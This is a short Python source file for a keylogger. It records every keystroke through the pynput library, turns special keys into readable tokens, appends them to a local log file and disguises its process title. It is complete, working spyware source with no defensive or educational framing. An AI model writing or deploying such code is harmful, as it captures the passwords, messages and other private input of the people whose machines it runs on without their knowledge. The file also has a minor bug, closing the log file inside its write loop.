from pynput.keyboard import Key, Listener
from re import sub
from setproctitle import setproctitle

filename = "the_keylogger_i_made_log.txt"
path = ""
extension = "\\"

count = 0
keys = []

replacement_map = {
    "Key.backspace": "[<-]",
    "Key.space": " ",
    "Key.left": "[<]",
    "Key.right": "[>]",
    "Key.up": "[^]",
    "Key.down": "[v]",
    "Key.enter": "[enter]\n"
}


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1

    # reset
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    fullpath = path + filename
    with open(fullpath, "a") as f:
        for key in keys:
            print(f"key = {key}")
            # get rid of annoying single quotes
            k = sub(r"[\'\"](.*)[\'\"]", r"\1", str(key))

            if k in replacement_map:
                f.write(replacement_map[k])

            # in case of other special characters, get rid of the "key." bit
            else:
                f.write(sub(r"Key\.(.*)", r"[\1]", k))

            f.close()


def on_release(key):
    if key == Key.esc:
        return False


if __name__ == "__main__":
    setproctitle("hehe_bad_as_mj")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
